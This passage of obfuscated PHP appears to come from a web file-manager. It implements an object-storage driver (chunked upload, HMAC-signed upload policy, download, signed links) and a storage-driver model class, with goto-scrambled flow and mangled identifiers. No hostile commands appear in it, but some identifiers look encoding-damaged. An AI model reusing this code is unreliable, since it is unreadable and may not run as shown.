upload($A£Ê…×£ğ, $c‹ÂÈ‘Ğ¸, $E¯à»â½§õ = false, $cƒ´®õÀŒ‘ = REPEAT_REPLACE) { goto Bœ°´¶„¡—; c©œ†§±ßó: $a‡å÷á‚ø¨ = $BµÚ¢ç‡»“[$E‡Û‰Ö‚Î[1354]]; $bùâ–‹šÛÜ = fopen($c‹ÂÈ‘Ğ¸, $E‡Û‰Ö‚Î[1259]); if (!$bùâ–‹šÛÜ) { return !1; } goto F½‚æÀ´êÓ; dàáæÈå: $a‘®ˆËˆç£ = $this->ussRequest($A£Ê…×£ğ, $E‡Û‰Ö‚Î[225], !1, $c˜·¢Òò‰); return $a‘®ˆËˆç£[$E‡Û‰Ö‚Î[1087]] ? $this->getPathOuter($DÏ»ëõÙáË) : !1; goto A²ñ¼ç; bôŞ÷äã™§: if (!$a‘®ˆËˆç£[$E‡Û‰Ö‚Î[1087]]) { return !1; } $BµÚ¢ç‡»“ = $a‘®ˆËˆç£[$E‡Û‰Ö‚Î[1089]]; $d¾¼…¦ß‰ = 0; goto c©œ†§±ßó; fíõÌ‰ŸáÓ: $c°¡¸÷Œ®Ô = 1024 * 1024 * 10; $c˜·¢Òò‰ = array($E‡Û‰Ö‚Î[1350], $E‡Û‰Ö‚Î[1351] . $DçõÌ”‘Ü§, $E‡Û‰Ö‚Î[1352], $E‡Û‰Ö‚Î[1353] . $c°¡¸÷Œ®Ô); $a‘®ˆËˆç£ = $this->ussRequest($A£Ê…×£ğ, $E‡Û‰Ö‚Î[225], !1, $c˜·¢Òò‰); goto bôŞ÷äã™§; F½‚æÀ´êÓ: do { $cµãõÑá¦ë = $BµÚ¢ç‡»“[$E‡Û‰Ö‚Î[1355]]; fseek_64($bùâ–‹šÛÜ, $d¾¼…¦ß‰); $C†×İâ½ï® = fread($bùâ–‹šÛÜ, $cµãõÑá¦ë); $d’Æ¶ˆáš = 0; do { $d’Æ¶ˆáš++; $BµÚ¢ç‡»“ = $this->uploadPart($A£Ê…×£ğ, $BµÚ¢ç‡»“, $C†×İâ½ï®); } while (!$BµÚ¢ç‡»“ && $d’Æ¶ˆáš < 3); if (!$BµÚ¢ç‡»“) { return !1; } $a‡å÷á‚ø¨ = $BµÚ¢ç‡»“[$E‡Û‰Ö‚Î[1354]]; $d¾¼…¦ß‰ += $cµãõÑá¦ë; } while ($a‡å÷á‚ø¨ != -1); fclose($bùâ–‹šÛÜ); $c˜·¢Òò‰ = array($E‡Û‰Ö‚Î[1356], $E‡Û‰Ö‚Î[1357] . $BµÚ¢ç‡»“[$E‡Û‰Ö‚Î[1358]], $E‡Û‰Ö‚Î[1352]); goto dàáæÈå; Bœ°´¶„¡—: $E‡Û‰Ö‚Î =& $_SERVER[´¬]; $DçõÌ”‘Ü§ = IO::size($c‹ÂÈ‘Ğ¸); if ($DçõÌ”‘Ü§ <= 1024 * 1024 * 200) { $b•Œ˜¸àˆ‡ = array($E‡Û‰Ö‚Î[1349] . $c‹ÂÈ‘Ğ¸); $a‘®ˆËˆç£ = $this->ussRequest($A£Ê…×£ğ, $E‡Û‰Ö‚Î[225], $b•Œ˜¸àˆ‡); return $a‘®ˆËˆç£[$E‡Û‰Ö‚Î[1087]] ? $this->getPathOuter($A£Ê…×£ğ) : !1; } goto fíõÌ‰ŸáÓ; A²ñ¼ç: } private function uploadPart($fÄø½Ä‘ã, $C‡²ëĞŒĞ¸, &$bâÄ„ËÆÖŠ) { $bÅ«ÚİæöÍ =& $_SERVER[´¬]; $c¦ãØ†¢Ü = array($bÅ«ÚİæöÍ[1359], $bÅ«ÚİæöÍ[1357] . $C‡²ëĞŒĞ¸[$bÅ«ÚİæöÍ[1358]], $bÅ«ÚİæöÍ[1360] . $C‡²ëĞŒĞ¸[$bÅ«ÚİæöÍ[1354]], $bÅ«ÚİæöÍ[141] . $C‡²ëĞŒĞ¸[$bÅ«ÚİæöÍ[1355]]); $F§Â”ì„™ = $this->ussRequest($fÄø½Ä‘ã, $bÅ«ÚİæöÍ[225], $bâÄ„ËÆÖŠ, $c¦ãØ†¢Ü); return !$F§Â”ì„™[$bÅ«ÚİæöÍ[1087]] ? $F§Â”ì„™[$bÅ«ÚİæöÍ[1087]] : $F§Â”ì„™[$bÅ«ÚİæöÍ[1089]]; } public function uploadFormData($B¡¡Öƒï¸‹, $b·ƒ™ƒÚõ = 3600) { return $this->uploadPolicy($B¡¡Öƒï¸‹, $b·ƒ™ƒÚõ); } public function multiUploadFormData($C‘‡ËŠåø´, $bˆøºß‚»à = 3600) { $Eã÷Ê¿—˜ =& $_SERVER[´¬]; $Aêñœ˜´äè = (int) $GLOBALS[$Eã÷Ê¿—˜[7]][$Eã÷Ê¿—˜[78]]; return $this->uploadPolicy($C‘‡ËŠåø´, $bˆøºß‚»à, $Aêñœ˜´äè); } private function uploadPolicy($dğ…îèœ‚Ú, $bî”ä‚Í¿« = 3600, $BŒ—¨Âßô„ = 0) { goto EóÑ‰Ñ »Ğ; EóÑ‰Ñ »Ğ: $E½Ìæ ŞáÂ =& $_SERVER[´¬]; $f‘Óƒí¬¿‰ = $E½Ìæ ŞáÂ[8] . $this->bucket; $FÌˆãÜĞºÔ = gmdate($E½Ìæ ŞáÂ[1296]); goto Cè˜ºµĞ†ß; e­ÚŸØá¨Î: $BÌùç‰¸Ù = base64_encode(hash_hmac($E½Ìæ ŞáÂ[1331], "\120\117\123\x54\x26{$f‘Óƒí¬¿‰}\x26{$FÌˆãÜĞºÔ}\46{$b›¦Éì•›í}", md5("{$this->userpass}"), !0)); $a²¯×ƒÍ³ = array($E½Ìæ ŞáÂ[1201] => $b›¦Éì•›í, $E½Ìæ ŞáÂ[1365] => "\125\120\131\125\116\x20{$this->username}\x3a{$BÌùç‰¸Ù}", $E½Ìæ ŞáÂ[175] => $this->endpoint . $f‘Óƒí¬¿‰); return $a²¯×ƒÍ³; goto DÏèƒÄ°Æ; Cè˜ºµĞ†ß: $b¹ÚÇ¶µ• = array($E½Ìæ ŞáÂ[1361] => $this->bucket, $E½Ìæ ŞáÂ[1362] => $dğ…îèœ‚Ú, $E½Ìæ ŞáÂ[1363] => time() + $bî”ä‚Í¿«, $E½Ìæ ŞáÂ[1364] => $FÌˆãÜĞºÔ); if ($BŒ—¨Âßô„) { $b¹ÚÇ¶µ•[$E½Ìæ ŞáÂ[1275]] = $BŒ—¨Âßô„; } $b›¦Éì•›í = base64_encode(json_encode($b¹ÚÇ¶µ•)); goto e­ÚŸØá¨Î; DÏèƒÄ°Æ: } public function download($e­µùáº•ç, $F¾æ‚†¾ƒ) { goto Eä™ô£™¯ë; Eä™ô£™¯ë: $B’«Ó»¾„É = IO::getPathInner(IO::mkfile($F¾æ‚†¾ƒ)); if (!($CÈÑçåŒŒ = $this->link($e­µùáº•ç))) { return !1; } $F¿—øïÙšÑ = 0; goto d…ô‚£¿ï‘; a²Î—ê±ô: fclose($AÉŠ›ÄŠ°Œ); return $F¾æ‚†¾ƒ; goto E½–İíÓò; d…ô‚£¿ï‘: $c‚ˆ”íÂ´ = 1024 * 200; $AÉŠ›ÄŠ°Œ = fopen($B’«Ó»¾„É, $_SERVER[´¬][1315]); while (!0) { $Cä¨ƒ àó‚ = $this->fileSubstr($e­µùáº•ç, $F¿—øïÙšÑ, $c‚ˆ”íÂ´); if ($Cä¨ƒ àó‚ === !1) { return !1; } fwrite($AÉŠ›ÄŠ°Œ, $Cä¨ƒ àó‚); $F¿—øïÙšÑ += $c‚ˆ”íÂ´; if (strlen($Cä¨ƒ àó‚) < $c‚ˆ”íÂ´) { break; } } goto a²Î—ê±ô; E½–İíÓò: } public function link($aÁ”ô˜ê›¾, $E‘Ö”á™Õ¨ = array()) { $D¤ÊŒèİ„Â =& $_SERVER[´¬]; $aÁ”ô˜ê›¾ = trim($aÁ”ô˜ê›¾, $D¤ÊŒèİ„Â[8]); if (!empty($this->token)) { $f–¼È™¢‹ = strtotime(date($D¤ÊŒèİ„Â[1366])); $EÄºº¦å… = substr(md5($this->token . $D¤ÊŒèİ„Â[281] . $f–¼È™¢‹ . $D¤ÊŒèİ„Â[1367] . $aÁ”ô˜ê›¾), 12, 8) . $f–¼È™¢‹; $E‘Ö”á™Õ¨[] = $D¤ÊŒèİ„Â[1368] . $EÄºº¦å…; } $c‰µ¢Ù‚ğË = !empty($E‘Ö”á™Õ¨) ? $D¤ÊŒèİ„Â[70] . implode($D¤ÊŒèİ„Â[281], $E‘Ö”á™Õ¨) : $D¤ÊŒèİ„Â[33]; return $this->getHost() . $D¤ÊŒèİ„Â[8] . $aÁ”ô˜ê›¾ . $c‰µ¢Ù‚ğË; } public function fileOut($c§»ª²¬Ãâ, $c†œ‹¦ãÈÒ = false, $b¿Ñ¯š¤ñİ = false, $D‚‰óËß… = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($c§»ª²¬Ãâ, $c†œ‹¦ãÈÒ, $b¿Ñ¯š¤ñİ, $D‚‰óËß…); } if (!$b¿Ñ¯š¤ñİ) { $b¿Ñ¯š¤ñİ = $this->pathThis($c§»ª²¬Ãâ); } $dƒ“ÕŠ…“î = $c†œ‹¦ãÈÒ ? array($_SERVER[´¬][1369] . rawurlencode($b¿Ñ¯š¤ñİ)) : array(); $D­»¨†ÒÎ = $this->link($c§»ª²¬Ãâ, $dƒ“ÕŠ…“î); $this->fileOutLink($D­»¨†ÒÎ); } public function fileOutServer($d‡ùÎÏ¥ë­, $A‚Å£¾–… = false, $f™‰Û‰Ø—× = false, $C©çïÄ½ƒ = '') { parent::fileOut($d‡ùÎÏ¥ë­, $A‚Å£¾–…, $f™‰Û‰Ø—×, $C©çïÄ½ƒ); } public function fileOutImage($bã‘¿è©, $B‚ô»ªàº = 250) { $Côä†°Ö‹ = $this->link($bã‘¿è© . $_SERVER[´¬][1370] . $B‚ô»ªàº); $this->fileOutLink($Côä†°Ö‹); } public function fileOutImageServer($Cóê¯¨„à, $b¶¹ÃŸ×…Ô = 250) { parent::fileOutImage($Cóê¯¨„à, $b¶¹ÃŸ×…Ô); } public function hashMd5($B­ÔÂôÄŞº) { $D––¨£‡•· =& $_SERVER[´¬]; $fä¿Œ×˜È = $this->_objectMeta($B­ÔÂôÄŞº); return isset($fä¿Œ×˜È[$D––¨£‡•·[207]]) ? $fä¿Œ×˜È[$D––¨£‡•·[207]] : !1; } public function size($cì²‹‚£œ…) { $d‡ØŞ“ÕĞ­ = $this->objectMeta($cì²‹‚£œ…); return $d‡ØŞ“ÕĞ­ ? $d‡ØŞ“ÕĞ­[$_SERVER[´¬][78]] : 0; } public function info($b„õ™æòÀ) { if ($this->isFolder($b„õ™æòÀ)) { return $this->folderInfo($b„õ™æòÀ); } else { if ($this->isFile($b„õ™æòÀ)) { return $this->fileInfo($b„õ™æòÀ); } } return !1; } public function exist($AÏ”¿‹£Ô¨) { return $this->isFile($AÏ”¿‹£Ô¨) || $this->isFolder($AÏ”¿‹£Ô¨); } public function isFile($dŞÁ¿›İà„) { return !$this->isFolder($dŞÁ¿›İà„) && $this->objectMeta($dŞÁ¿›İà„); } public function isFolder($FÂÇòŒÑÃñ) { return $this->cacheMethod($_SERVER[´¬][198], $FÂÇòŒÑÃñ); } protected function objectMeta($b¬ñˆ–”ãŠ) { return $this->cacheMethod($_SERVER[´¬][199], $b¬ñˆ–”ãŠ); } protected function _objectMeta($c™ÈÒ–æìç) { goto Aõõôß¨À; Aõõôß¨À: $eãƒåõ°× =& $_SERVER[´¬]; if ($c™ÈÒ–æìç == $eãƒåõ°×[33] || $c™ÈÒ–æìç == $eãƒåõ°×[8]) { return array(); } $C„Å•¥Ù‘§ = $this->ussRequest($c™ÈÒ–æìç, $eãƒåõ°×[1371]); goto eæøç½¥½¬; eæøç½¥½¬: if (!$C„Å•¥Ù‘§[$eãƒåõ°×[1087]]) { return null; } $c—Ô´¬ÄÂà = isset($C„Å•¥Ù‘§[$eãƒåõ°×[1089]]) ? $C„Å•¥Ù‘§[$eãƒåõ°×[1089]] : array(); if (!isset($c—Ô´¬ÄÂà[$eãƒåõ°×[1372]])) { return null; } goto FÁ‡êˆÊ–; FÁ‡êˆÊ–: $Eàí¾Ï‘ — = array($eãƒåõ°×[29] => isset($c—Ô´¬ÄÂà[$eãƒåõ°×[1372]]) ? $c—Ô´¬ÄÂà[$eãƒåõ°×[1372]] : null, $eãƒåõ°×[78] => isset($c—Ô´¬ÄÂà[$eãƒåõ°×[1373]]) ? $c—Ô´¬ÄÂà[$eãƒåõ°×[1373]] : null, $eãƒåõ°×[207] => isset($c—Ô´¬ÄÂà[$eãƒåõ°×[1374]]) ? $c—Ô´¬ÄÂà[$eãƒåõ°×[1374]] : null, $eãƒåõ°×[1341] => isset($c—Ô´¬ÄÂà[$eãƒåõ°×[1375]]) ? $c—Ô´¬ÄÂà[$eãƒåõ°×[1375]] : null); $Eàí¾Ï‘ —[$eãƒåõ°×[1342]] = isset($c—Ô´¬ÄÂà[$eãƒåõ°×[1376]]) ? strtotime($c—Ô´¬ÄÂà[$eãƒåõ°×[1376]]) : $Eàí¾Ï‘ —[$eãƒåõ°×[1341]]; return $Eàí¾Ï‘ —; goto BÙ¹èµ‘ÕÂ; BÙ¹èµ‘ÕÂ: } protected function _isFolder($BÚÑé†¹) { $a¦î¡•“Ô± =& $_SERVER[´¬]; if ($BÚÑé†¹ == $a¦î¡•“Ô±[33] || $BÚÑé†¹ == $a¦î¡•“Ô±[8]) { return !0; } $d³¬áˆØº‰ = $this->_objectMeta($BÚÑé†¹); return isset($d³¬áˆØº‰[$a¦î¡•“Ô±[29]]) && $d³¬áˆØº‰[$a¦î¡•“Ô±[29]] == $a¦î¡•“Ô±[77] ? !0 : !1; } } goto d‹œ‡°¬öø; BÚÔ£Ü°†: class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\x2e\163\164\157\162\x61\x67\x65\114\x69\x73\164"; public $field = array("\156\141\x6d\145", "\163\x69\172\x65\115\x61\x78", "\163\171\163\x74\x65\x6d", "\x64\x65\146\x61\165\154\164", "\x64\162\x69\166\x65\162", "\143\x6f\156\146\151\x67"); public function listData($dñÄî‹® = false, $Bõ¹ÚÒ•Àå = "\x6d\157\x64\x69\x66\x79\124\x69\155\145", $Dœ£¥ªàø = false) { $AåŒİ¢¯ñ =& $_SERVER[´¬]; $BË««³å = parent::listData($dñÄî‹®, $Bõ¹ÚÒ•Àå, $Dœ£¥ªàø); if ($dñÄî‹®) { return $BË««³å; } $a¢—©áóï… = $this->ioSizeUseGet(array_to_keyvalue($BË««³å, $AåŒİ¢¯ñ[33], $AåŒİ¢¯ñ[392])); foreach ($BË««³å as $AÛ­¨êˆ¯¾ => $cß¾õ Õ) { unset($BË««³å[$AÛ­¨êˆ¯¾][$AåŒİ¢¯ñ[6]]); $BË««³å[$AÛ­¨êˆ¯¾][$AåŒİ¢¯ñ[1675]] = isset($a¢—©áóï…[$cß¾õ Õ[$AåŒİ¢¯ñ[392]]]) ? $a¢—©áóï…[$cß¾õ Õ[$AåŒİ¢¯ñ[392]]] : 0; } return $BË««³å; } public function ioSizeUseGet($d—‘Ì’Æ¼Ğ) { goto c„¥Ø¾ œ; EÒ¯Ïáê…: $FŒ¤½»ôµ‹ = array($Bôß¶…†µá[782] => array($Bôß¶…†µá[7], $d—‘Ì’Æ¼Ğ)); $Cªî‰ø’Ú = Model($Bôß¶…†µá[747])->field($CÉ®‡Ô»‚Œ)->where($FŒ¤½»ôµ‹)->group($Bôß¶…†µá[782])->select(); $Cªî‰ø’Ú = array_to_keyvalue($Cªî‰ø’Ú, $Bôß¶…†µá[392], $Bôß¶…†µá[78]); goto c•›à¼ùàÖ; Cõ­× Ñ¿õ: $Cªî‰ø’Ú = Cache::get($DõÌ«ˆ‹Ë); if ($Cªî‰ø’Ú) { return $Cªî‰ø’Ú; } $CÉ®‡Ô»‚Œ = array($Bôß¶…†µá[782] => $Bôß¶…†µá[392], $Bôß¶…†µá[1989] => $Bôß¶…†µá[78]); goto EÒ¯Ïáê…; c•›à¼ùàÖ: Cache::set($DõÌ«ˆ‹Ë, $Cªî‰ø’Ú, 600); return $Cªî‰ø’Ú; goto EÌ³ƒ»§é; c„¥Ø¾ œ: $Bôß¶…†µá =& $_SERVER[´¬]; if (!$d—‘Ì’Æ¼Ğ) { return array(); } $DõÌ«ˆ‹Ë = $Bôß¶…†µá[1988] . implode($Bôß¶…†µá[47], $d—‘Ì’Æ¼Ğ); goto Cõ­× Ñ¿õ; EÌ³ƒ»§é: } public function getConfig($d—¨­¾Şà) { $fè¸¶‰ášÂ = parent::listData($d—¨­¾Şà); return json_decode($fè¸¶‰ášÂ[$_SERVER[´¬][6]], !0); } public function update($eœí£ç¯áŸ, $d¶¹Ú’¡Ç) { goto eæçÕå›¢¥; C«Ó‘’±µ: if (isset($b‰Ó½’áºà[$B·ŒèØÌÇÜ]) && $b‰Ó½’áºà[$B·ŒèØÌÇÜ][$cõÆ‡ ·ì[392]] != $eœí£ç¯áŸ) { return !1; } if (isset($d¶¹Ú’¡Ç[$cõÆ‡ ·ì[1990]]) && $d¶¹Ú’¡Ç[$cõÆ‡ ·ì[1990]] == $cõÆ‡ ·ì[87]) { $this->checkConfig($d¶¹Ú’¡Ç); } unset($d¶¹Ú’¡Ç[$cõÆ‡ ·ì[1990]]); goto dÈá´¹±ÇÀ; dÈá´¹±ÇÀ: $DŠöê‘éí = parent::update($eœí£ç¯áŸ, $d¶¹Ú’¡Ç); if ($DŠöê‘éí && $d¶¹Ú’¡Ç[$cõÆ‡ ·ì[34]]) { foreach ($b‰Ó½’áºà as $DÈë—Ë‰Åî) { if ($DÈë—Ë‰Åî[$cõÆ‡ ·ì[34]] && $DÈë—Ë‰Åî[$cõÆ‡ ·ì[392]] != $eœí£ç¯áŸ) { parent::update($DÈë—Ë‰Åî[$cõÆ‡ ·ì[392]], array($cõÆ‡ ·ì[34] => 0)); } } } return $DŠöê‘éí; goto dî¸Ç¹¥Œà; eæçÕå›¢¥: $cõÆ‡ ·ì =& $_SERVER[´¬]; $B·ŒèØÌÇÜ = $d¶¹Ú’¡Ç[$cõÆ‡ ·ì[28]]; $b‰Ó½’áºà = array_to_keyvalue(parent::listData(), $cõÆ‡ ·ì[28]); goto C«Ó‘’±µ; dî¸Ç¹¥Œà: } public function add($e˜ÚÃØ½Œ“) { goto FğŠŒ‡šŠ; FğŠŒ‡šŠ: $bÏ”Ÿ——ß =& $_SERVER[´¬]; $BƒÍëœÆá = array_to_keyvalue(parent::listData(), $bÏ”Ÿ——ß[28]); if (isset($BƒÍëœÆá[$e˜ÚÃØ½Œ“[$bÏ”Ÿ——ß[28]]])) { return !1; } goto eğœéˆ—ÎÁ; cÌ—Ç¹ç±‹: return $FÛ‡™Èä‰Ï; goto BØ˜ï Ğ‘¹; eğœéˆ—ÎÁ: $this->checkConfig($e˜ÚÃØ½Œ“); $FÛ‡™Èä‰Ï = parent::insert($e˜ÚÃØ½Œ“); if ($FÛ‡™Èä‰Ï && $e˜ÚÃØ½Œ“[$bÏ”Ÿ——ß[34]]) { foreach ($BƒÍëœÆá as $fœí„—è¦Ô) { if ($fœí„—è¦Ô[$bÏ”Ÿ——ß[34]]) { parent::update($fœí„—è¦Ô[$bÏ”Ÿ——ß[392]], array($bÏ”Ÿ——ß[34] => 0)); } } } goto cÌ—Ç¹ç±‹; BØ˜ï Ğ‘¹: } public function checkConfig(&$Dîù×‡ ) { goto BÄÄñÆÑÈ; bòÕ‚ªÇŸÀ: foreach ($dÁ¼ìæç×– as $EóèÁêçßˆ => $d¤õ©ã¼) { $dÁ¼ìæç×–[$EóèÁêçßˆ] = trim($d¤õ©ã¼); } $dÁ¼ìæç×–[$BĞñ¯šËè‚[1991]] = rand_string(6); $eƒ²°ëÕ¼´ = $GLOBALS[$BĞñ¯šËè‚[6]][$BĞñ¯šËè‚[88]][$BĞñ¯šËè‚[791]]; goto c£öé„Ë„³; b“òË‚Îƒ: $Dîù×‡ [$BĞñ¯šËè‚[6]] = json_encode($dÁ¼ìæç×–); $Dîù×‡ [$BĞñ¯šËè‚[94]] = $cÍ¥‚Ğ§äø; return !0; goto CÔ×±ÌÓ×¿; Eª·óçØ§: $C„æÂ¦ˆé¿ = $B²²…¤­›Ç->getPath($dœÖÊÊ¶ºñ . $BĞñ¯šËè‚[1138]); if (!$B²²…¤­›Ç->mkfile($C„æÂ¦ˆé¿)) { show_json(LNG($BĞñ¯šËè‚[1995]), !1); } $dÁ¼ìæç×–[$BĞñ¯šËè‚[1077]] = $dœÖÊÊ¶ºñ; goto b“òË‚Îƒ; BÄÄñÆÑÈ: $BĞñ¯šËè‚ =& $_SERVER[´¬]; $DëÔ˜»™‘˜ = strtolower($Dîù×‡ [$BĞñ¯šËè‚[94]]); $dÁ¼ìæç×– = json_decode($Dîù×‡ [$BĞñ¯šËè‚[6]], !0); goto bòÕ‚ªÇŸÀ; AÂƒ½ËÚ¡: $B²²…¤­›Ç = new $b…†±ãš®Â($dÁ¼ìæç×–); if (in_array($DëÔ˜»™‘˜, $B²²…¤­›Ç->objectDriver)) { if (!$B²²…¤­›Ç->isBucketCors() && !$B²²…¤­›Ç->setBucketCors()) { $dº’ğ‘›“ = LNG($BĞñ¯šËè‚[1995]); $dº’ğ‘›“ .= $BĞñ¯šËè‚[1996] . LNG($BĞñ¯šËè‚[1997]); show_json($dº’ğ‘›“, !1); } } $dœÖÊÊ¶ºñ = rtrim($dÁ¼ìæç×–[$BĞñ¯šËè‚[1077]], $BĞñ¯šËè‚[8]) . $BĞñ¯šËè‚[8]; goto Eª·óçØ§; c£öé„Ë„³: $cÍ¥‚Ğ§äø = isset($eƒ²°ëÕ¼´[$DëÔ˜»™‘˜]) ? $eƒ²°ëÕ¼´[$DëÔ˜»™‘˜] : ucfirst($DëÔ˜»™‘˜); $b…†±ãš®Â = $BĞñ¯šËè‚[72] . $cÍ¥‚Ğ§äø; if (!$cÍ¥‚Ğ§äø || !class_exists($b…†±ãš®Â)) { write_log(array($BĞñ¯šËè‚[1992], $Dîù×‡ , get_caller_info()), $BĞñ¯šËè‚[1993]); show_json(LNG($BĞñ¯šËè‚[1994]), !1, $Dîù×‡ ); } goto AÂƒ½ËÚ¡; CÔ×±ÌÓ×¿: } public function driverListSystem() { $BŠÊ¡Œòš =& $_SERVER[´¬]; $dÎ‡Ú›®Íá = parent::listData(); $a½Ïâ«Ş¡‹ = array(); foreach ($dÎ‡Ú›®Íá as $FøêŞà±‰») { unset($FøêŞà±‰»[$BŠÊ¡Œòš[193]], $FøêŞà±‰»[$BŠÊ¡Œòš[84]]); $FøêŞà±‰»[$BŠÊ¡Œòš[6]] = json_decode($FøêŞà±‰»[$BŠÊ¡Œòš[6]], !0); $a½Ïâ«Ş¡‹[] = $FøêŞà±‰»; } return $a½Ïâ«Ş¡‹; } public function defaultDriver() { $AÀîÜÂæäí =& $_SERVER[´¬]; $DôŠ¤–‚á¿ = parent::listData(); $eô‰×¶²ø‰ = array_filter_by_field($DôŠ¤–‚á¿, $AÀîÜÂæäí[34], 1); $eô‰×¶²ø‰ = $eô‰×¶²ø‰[0]; if ($eô‰×¶²ø‰) { $eô‰×¶²ø‰[$AÀîÜÂæäí[6]] = json_decode($eô‰×¶²ø‰[$AÀîÜÂæäí[6]], !0); } return $eô‰×¶²ø‰; } public function driverInfo($EÖùŸ£Í¨») { $A«øÊ¬ÚºÜ =& $_SERVER[´¬]; $Dà¡À‹²±Æ = array_to_keyvalue(parent::listData(), $A«øÊ¬ÚºÜ[392]); if (!isset($Dà¡À‹²±Æ[$EÖùŸ£Í¨»])) { return !1; } $a½ÀÍƒÆ‡ = $Dà¡À‹²±Æ[$EÖùŸ£Í¨»]; $a½ÀÍƒÆ‡[$A«øÊ¬ÚºÜ[6]] = json_decode($a½ÀÍƒÆ‡[$A«øÊ¬ÚºÜ[6]], !0); return $a½ÀÍƒÆ‡; } public function remove($eâËˆÃÒÈ) { $this->removeShareItems($eâËˆÃÒÈ); return parent::remove($eâËˆÃÒÈ); } public function removeWithFile($BÏŒôöîÄÍ, $E²‰ÊÃ®ÑÑ) { goto eÉ«”øËŠ; Aİ¼æåÒ¼¿: $FëÂ¥èÁ¯› = Model($Fø––æù™¨[448])->where($Eˆ“‘¢ÇÇŞ)->sum($Fø––æù™¨[78]); $Fó›Ê…‰ì = $E²‰ÊÃ®ÑÑ . $Fø––æù™¨[1998] . $BÏŒôöîÄÍ; $bÕŠÂ´…ÕŞ = new TaskFileTransfer($Fó›Ê…‰ì, $Fø––æù™¨[1993], $cƒ™ã¢ôÎ—, LNG($Fø––æù™¨[1999]) . "\50{$BÏŒôöîÄÍ}\x29"); goto AË»›¼í¤æ; AŒã‹ô•èİ: if (!$BÏĞ±“¤¡á) { $bÕŠÂ´…ÕŞ->stop($Fó›Ê…‰ì); return !1; } $bÕŠÂ´…ÕŞ->end(); if ($E²‰ÊÃ®ÑÑ == $Fø––æù™¨[1655]) { $this->remove($BÏŒôöîÄÍ); } goto Dãõ•½‡; bê„¶ºÇ¾Ó: $dù½¬À·ë¨ = "\x7b\151\157\x3a{$eÈÆİ”íåŸ}\175\57"; $BÏĞ±“¤¡á = !0; $CË¦Îø¡Á· = array(); goto A‹×ø¤ôÍ; A‹×ø¤ôÍ: $F¿ôÃËùŒÂ = Model($Fø––æù™¨[192])->where($Eˆ“‘¢ÇÇŞ)->field($Fø––æù™¨[2000])->select(); foreach ($F¿ôÃËùŒÂ as $A‹º¸áœÀ) { goto F ß”œ‚º; EãôÊí­²: if (IO::exist($FÇ‹„ÙçÆÅ)) { $bÕŠÂ´…ÕŞ->updateFileEnd($A‹º¸áœÀ[$Fø––æù™¨[28]], $A‹º¸áœÀ[$Fø––æù™¨[78]]); continue; } if (!IO::move($cô©Ÿ¦Û…Î, get_path_father($FÇ‹„ÙçÆÅ))) { $BÏĞ±“¤¡á = !1; break; } $Eˆ“‘¢ÇÇŞ = array($Fø––æù™¨[445] => $A‹º¸áœÀ[$Fø––æù™¨[445]]); goto AÒº·Ÿ¢Íê; AÒº·Ÿ¢Íê: $eÂÍ¶·ë¾ù = array($Fø––æù™¨[782] => $eÈÆİ”íåŸ, $Fø––æù™¨[76] => $FÇ‹„ÙçÆÅ); Model($Fø––æù™¨[192])->where($Eˆ“‘¢ÇÇŞ)->save($eÂÍ¶·ë¾ù); goto dÊ§ÊÆƒĞ‘; F ß”œ‚º: $cô©Ÿ¦Û…Î = $A‹º¸áœÀ[$Fø––æù™¨[76]]; $FÇ‹„ÙçÆÅ = $dù½¬À·ë¨ . str_replace("\173\x69\x6f\x3a{$BÏŒôöîÄÍ}\175\x2f", $Fø––æù™¨[33], $cô©Ÿ¦Û…Î); if (!IO::exist($cô©Ÿ¦Û…Î)) { $CË¦Îø¡Á·[] = $A‹º¸áœÀ[$Fø––æù™¨[445]]; $bÕŠÂ´…ÕŞ->updateFileEnd($A‹º¸áœÀ[$Fø––æù™¨[28]], $A‹º¸áœÀ[$Fø––æù™¨[78]]); continue; } goto EãôÊí­²; dÊ§ÊÆƒĞ‘: } $this->removeByFileID($CË¦Îø¡Á·); goto AŒã‹ô•èİ; eÉ«”øËŠ: $Fø––æù™¨ =& $_SERVER[´¬]; $Eˆ“‘¢ÇÇŞ = array($Fø––æù™¨[782] => $BÏŒôöîÄÍ); $cƒ™ã¢ôÎ— = Model($Fø––æù™¨[448])->where($Eˆ“‘¢ÇÇŞ)->count(); goto Aİ¼æåÒ¼¿; AË»›¼í¤æ: $bÕŠÂ´…ÕŞ->task[$Fø––æù™¨[723]] = (double) $FëÂ¥èÁ¯›; $C«·¬øß»Å = KodIO::defaultDriver(); $eÈÆİ”íåŸ = $C«·¬øß»Å[$Fø––æù™¨[392]]; goto bê„¶ºÇ¾Ó; Dãõ•½‡: } public function progress($F›Ä¨¹‰Çø, $C™ŠŸ¿ëß¿) { return Task::get($C™ŠŸ¿ëß¿ . $_SERVER[´¬][1998] . $F›Ä¨¹‰Çø); } private function removeByFileID($e«ôáÑ´… = array()) { goto f•ÙòĞ“«Ú; aÔíª†ŠŞã: foreach ($C¯µ…ïÄ–¡ as $C¶ãÌ…‡Ûç) { Model($c“…ïÆ³Ü™[407])->removeNow($C¶ãÌ…‡Ûç, !1); } goto B¸ÑˆŒ§êĞ; f•ÙòĞ“«Ú: $c“…ïÆ³Ü™ =& $_SERVER[´¬]; if (empty($e«ôáÑ´…)) { return; } $DÉ©§íõ = array($c“…ïÆ³Ü™[445] => array($c“…ïÆ³Ü™[7], $e«ôáÑ´…)); goto Fõ‹‚Ùº„; Fõ‹‚Ùº„: $C¯µ…ïÄ–¡ = Model($c“…ïÆ³Ü™[1206])->where($DÉ©§íõ)->field($c“…ïÆ³Ü™[394])->select(); if (!$C¯µ…ïÄ–¡) { return; } $C¯µ…ïÄ–¡ = array_to_keyvalue($C¯µ…ïÄ–¡, $c“…ïÆ³Ü™[33], $c“…ïÆ³Ü™[394]); goto aÔíª†ŠŞã; B¸ÑˆŒ§êĞ: } private function removeShareItems($d«²ÎŒêà¼) { goto BË—šÔ›™À; E‰ÇÏ°ÁÁĞ: Model($fĞ°¸…«¦¥[562])->remove($B¿ÍÆæ£â); goto aéŞµÛº; dõÂ‡óŞ‡: $BË§¿ß§÷Ğ = Model($fĞ°¸…«¦¥[1666])->where($b¾¶†ò¬Ğ)->field($fĞ°¸…«¦¥[466])->select(); if (empty($BË§¿ß§÷Ğ)) { return; } $B¿ÍÆæ£â = array_to_keyvalue($BË§¿ß§÷Ğ, $fĞ°¸…«¦¥[33], $fĞ°¸…«¦¥[466]); goto E‰ÇÏ°ÁÁĞ; BË—šÔ›™À: $fĞ°¸…«¦¥ =& $_SERVER[´¬]; $dğ ³ÜŞØÕ = 